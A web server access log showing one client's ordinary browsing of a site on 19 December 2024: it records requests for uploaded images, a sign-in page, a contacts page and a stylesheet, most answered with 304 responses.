::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_5906538224795919.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /images/profile-icon-9.png HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_9995415795716626.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_5501551396745377.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_6290533520615136.png HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_2096661224276426.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_5713270388335383.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_2563655112739389.png HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_6095683928810578.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_4800013465138124.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:10 +0000] "GET /uploads/resized_5760203316234753.jpg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:10 +0000] "GET /uploads/resized_5906602684026616.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:10 +0000] "GET /uploads/resized_5410528507333614.jpg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:11 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:11 +0000] "GET /signin HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:12 +0000] "GET /css/main.css HTTP/1.1" 304 - "https://bro718.ru/signin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:12 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "https://bro718.ru/signin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:13 +0000] "GET /contacts HTTP/1.1" 304 - "https://bro718.ru/signin" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:13 +0000] "GET /css/main.css HTTP/1.1" 304 - "https://bro718.ru/contacts" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
